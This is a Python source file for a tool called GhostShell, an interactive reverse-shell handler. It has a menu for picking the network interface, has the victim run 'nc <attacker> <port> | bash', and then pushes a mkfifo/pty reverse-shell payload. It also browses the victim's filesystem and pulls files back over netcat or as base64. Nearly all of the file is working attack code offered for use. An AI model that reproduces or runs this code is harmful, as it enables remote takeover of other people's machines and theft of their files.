#!/usr/bin/env python3

import socket
import sys
import select
import termios
import tty
import os
import threading
import time
import shutil
import signal
import subprocess
import re
import fcntl

# ─────────────────────────────────────────
#  NETWORK HELPERS
# ─────────────────────────────────────────

def get_interfaces():
    interfaces = []
    try:
        result = subprocess.run(['ip', '-o', '-4', 'addr', 'show'],
                                capture_output=True, text=True)
        for line in result.stdout.splitlines():
            parts = line.split()
            if len(parts) >= 4:
                iface = parts[1]
                ip = parts[3].split('/')[0]
                interfaces.append((iface, ip))
    except:
        pass
    return interfaces

def read_key(fd):
    ch = os.read(fd, 1)
    if ch == b'\x1b':
        try:
            old_fl = fcntl.fcntl(fd, fcntl.F_GETFL)
            fcntl.fcntl(fd, fcntl.F_SETFL, old_fl | os.O_NONBLOCK)
            rest = b""
            for _ in range(4):
                try:
                    b = os.read(fd, 1)
                    rest += b
                    if b and b[-1:].isalpha():
                        break
                except BlockingIOError:
                    break
            ch += rest
        except:
            pass
        finally:
            try:
                fcntl.fcntl(fd, fcntl.F_SETFL, old_fl)
            except:
                pass
    return ch

def pick_interface():
    interfaces = get_interfaces()
    if not interfaces:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
        finally:
            s.close()

    selected = 0
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)

    def draw(first=False):
        if not first:
            for _ in range(len(interfaces)):
                sys.stdout.write("\033[1A\r\033[2K")
        for i, (iface, ip) in enumerate(interfaces):
            if i == selected:
                sys.stdout.write(f"\r  \033[1;36m▶  {iface:<12} {ip}\033[0m\n")
            else:
                sys.stdout.write(f"\r     \033[2m{iface:<12} {ip}\033[0m\n")
        sys.stdout.flush()

    sys.stdout.write(f"  \033[1;36m[?]\033[0m Select interface \033[2m(↑↓ arrow + Enter)\033[0m\r\n\r\n")
    sys.stdout.flush()
    draw(first=True)

    try:
        tty.setraw(fd)
        while True:
            ch = read_key(fd)
            if ch == b'\x1b[A':
                selected = (selected - 1) % len(interfaces)
                draw()
            elif ch == b'\x1b[B':
                selected = (selected + 1) % len(interfaces)
                draw()
            elif ch[0:1] in (b'\r', b'\n'):
                break
            elif ch[0:1] == b'\x03':
                termios.tcsetattr(fd, termios.TCSADRAIN, old)
                print()
                sys.exit(0)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)

    print()
    return interfaces[selected][1]

def get_terminal_size():
    size = shutil.get_terminal_size(fallback=(80, 24))
    return size.lines, size.columns

def make_server(port):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(1)
    return srv

def banner():
    print("\033[1;36m")
    print("  ░██████╗░██╗  ██╗░█████╗░░██████╗████████╗░██████╗██╗  ██╗███████╗██╗░░░░░██╗░░░░░")
    print("  ██╔════╝░██║  ██║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██║  ██║██╔════╝██║░░░░░██║░░░░░")
    print("  ██║░░██╗░███████║██║░░██║╚█████╗░   ██║   ╚█████╗░███████║█████╗  ██║░░░░░██║░░░░░")
    print("  ██║░░╚██╗██╔══██║██║░░██║░╚═══██╗   ██║   ░╚═══██╗██╔══██║██╔══╝  ██║░░░░░██║░░░░░")
    print("  ╚██████╔╝██║  ██║╚█████╔╝██████╔╝   ██║   ██████╔╝██║  ██║███████╗███████╗███████╗")
    print("  ░╚═════╝░╚═╝  ╚═╝░╚════╝░╚═════╝░   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝")
    print("\033[0m")

# ─────────────────────────────────────────
#  ARROW MENU — small menus
# ─────────────────────────────────────────

def arrow_menu(fd, title, options, color="\033[1;36m"):
    selected = 0

    def draw(first=False):
        if not first:
            for _ in range(len(options) + 2):
                sys.stdout.write("\033[1A\r\033[2K")
        sys.stdout.write(f"\r  {color}[?]\033[0m {title}\r\n\r\n")
        for i, opt in enumerate(options):
            if i == selected:
                sys.stdout.write(f"\r   {color}▶  {opt}\033[0m\n")
            else:
                sys.stdout.write(f"\r      \033[2m{opt}\033[0m\n")
        sys.stdout.flush()

    draw(first=True)

    while True:
        ch = read_key(fd)
        if ch == b'\x1b[A':
            selected = (selected - 1) % len(options)
            draw()
        elif ch == b'\x1b[B':
            selected = (selected + 1) % len(options)
            draw()
        elif ch[0:1] in (b'\r', b'\n'):
            sys.stdout.write("\r\n")
            sys.stdout.flush()
            return selected
        elif ch[0:1] == b'\x03':
            sys.stdout.write("\r\n  \033[1;33m[!]\033[0m Cancelled\r\n")
            sys.stdout.flush()
            return -1

# ─────────────────────────────────────────
#  SCROLLING MENU — for file lists
# ─────────────────────────────────────────

def scrolling_menu(fd, title, options, color="\033[1;36m"):
    selected  = 0
    offset    = 0
    rows, _   = get_terminal_size()
    page_size = max(5, rows - 8)

    def draw(first=False):
        nonlocal offset
        if selected < offset:
            offset = selected
        if selected >= offset + page_size:
            offset = selected - page_size + 1

        visible    = options[offset:offset + page_size]
        total      = len(options)
        line_count = len(visible) + 2

        if not first:
            for _ in range(line_count):
                sys.stdout.write("\033[1A\r\033[2K")

        sys.stdout.write(
            f"\r  {color}[?]\033[0m {title}  "
            f"\033[2m({selected+1}/{total} | PgUp/PgDn)\033[0m\r\n\r\n"
        )
        for i, opt in enumerate(visible):
            real_i = offset + i
            if real_i == selected:
                sys.stdout.write(f"\r   {color}▶  {opt}\033[0m\n")
            else:
                sys.stdout.write(f"\r      \033[2m{opt}\033[0m\n")
        sys.stdout.flush()

    draw(first=True)

    while True:
        ch = read_key(fd)
        if ch == b'\x1b[A':
            selected = (selected - 1) % len(options)
            draw()
        elif ch == b'\x1b[B':
            selected = (selected + 1) % len(options)
            draw()
        elif ch == b'\x1b[5~':
            selected = max(0, selected - page_size)
            draw()
        elif ch == b'\x1b[6~':
            selected = min(len(options) - 1, selected + page_size)
            draw()
        elif ch[0:1] in (b'\r', b'\n'):
            sys.stdout.write("\r\n")
            sys.stdout.flush()
            return selected
        elif ch[0:1] == b'\x03':
            sys.stdout.write("\r\n  \033[1;33m[!]\033[0m Cancelled\r\n")
            sys.stdout.flush()
            return -1

# ─────────────────────────────────────────
#  SOCK HELPERS
# ─────────────────────────────────────────

def sock_read_until(shell_sock, marker, timeout=10):
    buf      = ""
    deadline = time.time() + timeout
    shell_sock.setblocking(False)
    try:
        while time.time() < deadline:
            try:
                data = shell_sock.recv(8192)
                if data:
                    buf += data.decode(errors='ignore')
                    clean = re.sub(r'\x1b\[[0-9;]*[A-Za-z]', '', buf)
                    clean = re.sub(r'\x1b\][^\x07]*\x07', '', clean)
                    clean = clean.replace('\r', '')
                    if marker in clean:
                        return clean
                else:
                    time.sleep(0.05)
            except BlockingIOError:
                time.sleep(0.05)
            except:
                break
    finally:
        shell_sock.setblocking(True)
    clean = re.sub(r'\x1b\[[0-9;]*[A-Za-z]', '', buf)
    return clean.replace('\r', '')

def sock_drain(shell_sock, timeout=0.8):
    shell_sock.setblocking(False)
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            data = shell_sock.recv(4096)
            if not data:
                break
        except:
            break
        time.sleep(0.02)
    shell_sock.setblocking(True)

# ─────────────────────────────────────────
#  GET DIRECTORY LISTING
# ─────────────────────────────────────────

def get_victim_ls(shell_sock, remote_path):
    marker = f"GSMARK{int(time.time())}END"
    cmd    = f"ls -1ap {remote_path}; echo {marker}\n"
    shell_sock.sendall(cmd.encode())

    buf = sock_read_until(shell_sock, marker, timeout=10)
    sock_drain(shell_sock, timeout=0.5)

    entries   = []
    recording = False
    for line in buf.splitlines():
        s = line.strip()
        if not s:
            continue
        if 'ls -1ap' in s:
            recording = True
            continue
        if marker in s:
            break
        if not recording:
            continue
        if re.search(r'[\$\#]\s*$', s):
            continue
        if any(x in s for x in ('┌', '└', '╔', '╚', '─', '╼')):
            continue
        if s == './':
            continue
        is_dir = s.endswith('/')
        label  = f"\033[1;34m📁 {s}\033[0m" if is_dir else f"📄 {s}"
        entries.append((label, s, is_dir))

    return entries

# ─────────────────────────────────────────
#  SHARED FILE BROWSER
#  mode: "transfer" or "base64"
# ─────────────────────────────────────────

def browse_victim(shell_sock, fd, mode="transfer"):
    """
    Browse victim filesystem.
    Returns (remote_filepath, filename) of selected file.
    Returns (None, None) if cancelled.
    """
    cwd = "."

    while True:
        sock_drain(shell_sock, timeout=1.0)

        sys.stdout.write(f"\r\n  \033[1;36m[*]\033[0m Fetching listing of \033[1;33m{cwd}\033[0m...\r\n")
        sys.stdout.flush()

        entries = get_victim_ls(shell_sock, cwd)

        if not entries:
            sys.stdout.write("  \033[1;31m[!]\033[0m Empty or unreadable directory.\r\n\r\n")
            sys.stdout.flush()
            if cwd != ".":
                cwd = os.path.normpath(os.path.join(cwd, ".."))
                continue
            return None, None

        labels = [e[0] for e in entries]

        choice = scrolling_menu(
            fd,
            f"Browse \033[1;33m{cwd}\033[0m",
            labels
        )

        if choice == -1:
            return None, None

        _, name, is_dir = entries[choice]

        if is_dir:
            if name == '../':
                if cwd != ".":
                    cwd = os.path.normpath(os.path.join(cwd, ".."))
            else:
                stripped = name.rstrip('/')
                cwd = stripped if cwd == "." else cwd + "/" + stripped
            continue

        # file selected
        remote_filepath = name if cwd == "." else cwd + "/" + name
        filename        = os.path.basename(remote_filepath)
        return remote_filepath, filename

# ─────────────────────────────────────────
#  OPTION 1 — FILE TRANSFER
# ─────────────────────────────────────────

def do_receive_file(shell_sock, file_port, remote_filepath):
    sys.stdout.write(f"\r\n  \033[1;36m[*]\033[0m Requesting \033[1;33m{remote_filepath}\033[0m...\r\n")
    sys.stdout.flush()

    try:
        srv = make_server(file_port)
        srv.settimeout(30)

        sock_drain(shell_sock, timeout=0.5)
        time.sleep(0.3)

        shell_sock.sendall(f"send \"{remote_filepath}\"\n".encode())

        sys.stdout.write(f"  \033[1;36m[*]\033[0m Waiting on port {file_port}...\r\n")
        sys.stdout.flush()

        conn, _ = srv.accept()
        srv.close()

        save_name = os.path.basename(remote_filepath.rstrip('/'))
        save_path = os.path.join(os.getcwd(), save_name)
        total = 0
        with open(save_path, 'wb') as f:
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                f.write(data)
                total += len(data)
        conn.close()

        sock_drain(shell_sock, timeout=0.5)

        sys.stdout.write(f"\r\n  \033[1;32m[+]\033[0m Transfer complete!\r\n")
        sys.stdout.write(f"  \033[1;32m[+]\033[0m Received  : \033[1;33m{total}\033[0m bytes\r\n")
        sys.stdout.write(f"  \033[1;32m[+]\033[0m Saved     : \033[1;33m{save_path}\033[0m\r\n\r\n")
        sys.stdout.flush()
        return True

    except socket.timeout:
        sys.stdout.write(f"\r\n  \033[1;31m[!]\033[0m Timed out (30s)\r\n\r\n")
        sys.stdout.flush()
        return False
    except Exception as e:
        sys.stdout.write(f"\r\n  \033[1;31m[!]\033[0m Error: {e}\r\n\r\n")
        sys.stdout.flush()
        return False

def file_transfer_flow(shell_sock, file_port, fd):
    while True:
        remote_filepath, filename = browse_victim(shell_sock, fd, mode="transfer")

        if remote_filepath is None:
            return

        success = do_receive_file(shell_sock, file_port, remote_filepath)

        if success:
            what = arrow_menu(fd, "What next?",
                              ["Send another file", "Back to shell"],
                              color="\033[1;32m")
        else:
            what = arrow_menu(fd, "Transfer failed. What next?",
                              ["Try again", "Back to shell"],
                              color="\033[1;31m")

        if what == 0:
            continue
        else:
            return

# ─────────────────────────────────────────
#  OPTION 2 — BASE64 ENCODE
# ─────────────────────────────────────────

def do_base64_encode(shell_sock, fd, remote_filepath, filename):
    sys.stdout.write(f"\r\n  \033[1;36m[*]\033[0m Encoding \033[1;33m{remote_filepath}\033[0m...\r\n")
    sys.stdout.flush()

    ts         = int(time.time())
    mark_start = f"B64START{ts}"
    mark_end   = f"B64END{ts}"
    mark_md5   = f"MD5DONE{ts}"

    sock_drain(shell_sock, timeout=0.5)
    time.sleep(0.2)

    cmd = (
        f"echo {mark_start}; "
        f"base64 \"{remote_filepath}\"; "
        f"echo {mark_end}; "
        f"md5sum \"{remote_filepath}\"; "
        f"echo {mark_md5}\n"
    )
    shell_sock.sendall(cmd.encode())

    sys.stdout.write(f"  \033[1;36m[*]\033[0m Waiting for output...\r\n")
    sys.stdout.flush()

    buf = sock_read_until(shell_sock, mark_md5, timeout=30)
    sock_drain(shell_sock, timeout=0.5)

    # ── parse base64 block ──
    b64_lines = []
    md5_hash  = ""
    in_b64    = False

    for line in buf.splitlines():
        s = line.strip()
        if not s:
            continue
        if mark_start in s:
            in_b64 = True
            continue
        if mark_end in s:
            in_b64 = False
            continue
        if mark_md5 in s:
            break
        if in_b64 and s:
            b64_lines.append(s)
        if not in_b64 and s and not any(
            m in s for m in (mark_start, mark_end, mark_md5, 'base64', 'md5sum', 'echo')
        ):
            parts = s.split()
            if parts and len(parts[0]) == 32 and all(
                c in '0123456789abcdef' for c in parts[0]
            ):
                md5_hash = parts[0]

    b64_data = "\n".join(b64_lines)

    if not b64_data:
        sys.stdout.write(f"  \033[1;31m[!]\033[0m Failed to capture base64 output.\r\n\r\n")
        sys.stdout.flush()
        return False

    # ── display results ──
    b64_filename = filename + ".b64"
    sep = "─" * 58
    sys.stdout.write(f"\r\n")
    sys.stdout.write(f"  \033[1;32m[+]\033[0m File     : \033[1;33m{filename}\033[0m\r\n")
    sys.stdout.write(f"  \033[1;32m[+]\033[0m MD5      : \033[1;33m{md5_hash if md5_hash else 'unavailable'}\033[0m\r\n")
    sys.stdout.write(f"\r\n")
    sys.stdout.write(f"  \033[1;36m[*]\033[0m Base64 output \033[2m(copy between the lines)\033[0m:\r\n")
    sys.stdout.write(f"  \033[2m{sep}\033[0m\r\n")
    for line in b64_lines:
        sys.stdout.write(f"  {line}\r\n")
    sys.stdout.write(f"  \033[2m{sep}\033[0m\r\n")
    sys.stdout.write(f"\r\n")
    sys.stdout.write(f"  \033[1;36m[*]\033[0m Copy the base64 above into a file named: \033[1;33m{b64_filename}\033[0m\r\n")
    sys.stdout.write(f"  \033[1;36m[*]\033[0m Then run:\r\n")
    sys.stdout.write(f"  \033[1;33m    base64 -d {b64_filename} > {filename}\033[0m\r\n")
    sys.stdout.write(f"  \033[1;33m    md5sum {filename}\033[0m\r\n")
    sys.stdout.write(f"  \033[2m    verify: {md5_hash if md5_hash else 'N/A'}\033[0m\r\n")
    sys.stdout.write(f"\r\n")
    sys.stdout.flush()
    return True

def base64_flow(shell_sock, fd):
    while True:
        remote_filepath, filename = browse_victim(shell_sock, fd, mode="base64")

        if remote_filepath is None:
            return

        success = do_base64_encode(shell_sock, fd, remote_filepath, filename)

        if success:
            what = arrow_menu(fd, "What next?",
                              ["Encode another file", "Back to shell"],
                              color="\033[1;32m")
        else:
            what = arrow_menu(fd, "Encoding failed. What next?",
                              ["Try again", "Back to shell"],
                              color="\033[1;31m")

        if what == 0:
            continue
        else:
            sock_drain(shell_sock, timeout=0.3)  # ← add this
            return

# ─────────────────────────────────────────
#  SEND FLOW — method picker
# ─────────────────────────────────────────

def send_file_flow(shell_sock, file_port, fd):
    method = arrow_menu(
        fd,
        "Transfer method:",
        ["Send file", "Base64"]
    )

    if method == 0:
        file_transfer_flow(shell_sock, file_port, fd)
    elif method == 1:
        base64_flow(shell_sock, fd)

# ─────────────────────────────────────────
#  KILL VICTIM CONNECTION
# ─────────────────────────────────────────

def kill_victim(shell_sock):
    try:
        shell_sock.sendall(b'exit\n')
        time.sleep(0.3)
    except:
        pass

# ─────────────────────────────────────────
#  INTERACTIVE LOOP
# ─────────────────────────────────────────

def interactive(shell_sock, attacker_ip, file_port):
    fd            = sys.stdin.fileno()
    old_settings  = termios.tcgetattr(fd)
    input_buf     = b""

    printer_stop  = threading.Event()
    printer_pause = threading.Event()
    printer_pause.clear()

    def shell_printer():
        while not printer_stop.is_set():
            if printer_pause.is_set():
                time.sleep(0.02)
                continue
            r, _, _ = select.select([shell_sock], [], [], 0.05)
            if r:
                try:
                    data = shell_sock.recv(4096)
                    if not data:
                        printer_stop.set()
                        break
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
                except:
                    printer_stop.set()
                    break

    printer = threading.Thread(target=shell_printer, daemon=True)
    printer.start()

    def on_resize(signum, frame):
        r, c = get_terminal_size()
        try:
            shell_sock.sendall(f"stty rows {r} cols {c}\n".encode())
        except:
            pass

    signal.signal(signal.SIGWINCH, on_resize)

    try:
        tty.setraw(fd)

        while True:
            r, _, _ = select.select([sys.stdin], [], [], 0.1)
            if not r:
                continue

            char = os.read(fd, 1)
            if not char:
                raise Exception("stdin closed")

            if char == b'\x04':
                raise Exception("Attacker pressed Ctrl+D")

            if char in (b'\r', b'\n'):
                cmd = input_buf.decode(errors='ignore').strip()
                input_buf = b""

                if cmd == "send":
                    printer_pause.set()
                    time.sleep(0.15)
                    try:
                        shell_sock.sendall(b'\x03')
                        time.sleep(0.3)
                        sock_drain(shell_sock, timeout=0.8)
                        sys.stdout.write("\r\n")
                        sys.stdout.flush()
                        send_file_flow(shell_sock, file_port, fd)
                    finally:
                        sock_drain(shell_sock, timeout=0.3)
                        input_buf = b""
                        tty.setraw(fd)
                        printer_pause.clear()

                elif cmd == "exit":
                    raise Exception("Attacker typed exit")

                else:
                    shell_sock.sendall(char)

            elif char in (b'\x7f', b'\x08'):
                if input_buf:
                    input_buf = input_buf[:-1]
                shell_sock.sendall(char)

            elif char < b'\x20':
                input_buf = b""
                shell_sock.sendall(char)

            else:
                input_buf += char
                if len(input_buf) > 200:
                    input_buf = input_buf[-200:]
                shell_sock.sendall(char)

    except KeyboardInterrupt:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
        sys.stdout.write("\n\033[1;33m[!]\033[0m Ctrl+C — closing session.\n")
        sys.stdout.flush()
        kill_victim(shell_sock)

    except Exception as e:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
        msg = str(e)
        if "Attacker typed exit" in msg:
            sys.stdout.write("\n\033[1;33m[!]\033[0m Exit — closing session.\n")
        elif "Ctrl+D" in msg:
            sys.stdout.write("\n\033[1;33m[!]\033[0m Ctrl+D — closing session.\n")
        else:
            sys.stdout.write(f"\n\033[1;31m[!]\033[0m Disconnected: {msg}\n")
        sys.stdout.flush()
        kill_victim(shell_sock)

    finally:
        printer_stop.set()
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
        try:
            shell_sock.close()
        except:
            pass
        print("\n\033[1;36m[*]\033[0m GhostShell session ended.")

# ─────────────────────────────────────────
#  SETUP & CONNECT
# ─────────────────────────────────────────

banner()

ATTACKER_IP = pick_interface()
print(f"  \033[1;36m[*]\033[0m Using IP    : \033[1;33m{ATTACKER_IP}\033[0m")

try:
    PORT = int(input("  \033[1;36m[?]\033[0m Listen port : ").strip())
except ValueError:
    PORT = 4444

SHELL_PORT = PORT + 1
FILE_PORT  = PORT + 2

print(f"  \033[1;36m[*]\033[0m Cmd  port   : {PORT}")
print(f"  \033[1;36m[*]\033[0m Shell port  : {SHELL_PORT}")
print(f"  \033[1;36m[*]\033[0m File  port  : {FILE_PORT}")
print()

shell_sock  = None
shell_ready = threading.Event()

def await_shell():
    global shell_sock
    srv = make_server(SHELL_PORT)
    srv.settimeout(60)
    print(f"  \033[1;36m[*]\033[0m Waiting for shell on port {SHELL_PORT}...")
    try:
        shell_sock, addr = srv.accept()
        print(f"  \033[1;32m[+]\033[0m Shell connected from {addr[0]}:{addr[1]}")
        shell_ready.set()
    except socket.timeout:
        print(f"  \033[1;31m[!]\033[0m Shell timed out on port {SHELL_PORT}")
    finally:
        srv.close()

t = threading.Thread(target=await_shell, daemon=True)
t.start()
time.sleep(0.3)

print(f"  \033[1;36m[*]\033[0m Waiting for victim on port {PORT}...")
print(f"  \033[1;36m[*]\033[0m Run this on victim:")
print()
print(f"      \033[1;31mnc {ATTACKER_IP} {PORT} | bash\033[0m")
print()

cmd_srv = make_server(PORT)
cmd_sock, addr = cmd_srv.accept()
cmd_srv.close()
print(f"  \033[1;32m[+]\033[0m Victim connected from {addr[0]}:{addr[1]}")

rows, cols = get_terminal_size()

send_func = f"send() {{ cat \"$1\" | nc -w 3 {ATTACKER_IP} {FILE_PORT}; }}"

payload = (
    f"rm -f /tmp/.rs; mkfifo /tmp/.rs; "
    f"cat /tmp/.rs | python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>&1 | nc {ATTACKER_IP} {SHELL_PORT} > /tmp/.rs\n"
)

print(f"  \033[1;36m[*]\033[0m Sending payload...")
try:
    cmd_sock.sendall(payload.encode())
    time.sleep(0.5)
    cmd_sock.close()
except Exception as e:
    print(f"  \033[1;31m[!]\033[0m Failed to send payload: {e}")
    sys.exit(1)

print(f"  \033[1;36m[*]\033[0m Waiting for shell callback (60s)...")
shell_ready.wait(timeout=60)

if not shell_sock:
    print("\n  \033[1;31m[!]\033[0m Shell did not connect back.")
    sys.exit(1)

time.sleep(1.0)

shell_sock.setblocking(False)
deadline = time.time() + 0.5
while time.time() < deadline:
    try:
        shell_sock.recv(4096)
    except:
        break
    time.sleep(0.05)
shell_sock.setblocking(True)

shell_sock.sendall(f"stty rows {rows} cols {cols}\n".encode())
time.sleep(0.3)
shell_sock.sendall(f"export TERM=xterm-256color\n".encode())
time.sleep(0.3)
shell_sock.sendall(f"{send_func}\n".encode())
time.sleep(0.3)
shell_sock.sendall(b"clear\n")
time.sleep(0.5)

print(f"  \033[1;32m[+]\033[0m Shell ready!")
print(f"  \033[1;36m[*]\033[0m Type \033[1;33msend\033[0m to open transfer menu")
print(f"  \033[1;36m[*]\033[0m Type \033[1;33mexit\033[0m or press \033[1;33mCtrl+D\033[0m to end session\n")
time.sleep(0.3)

interactive(shell_sock, ATTACKER_IP, FILE_PORT)
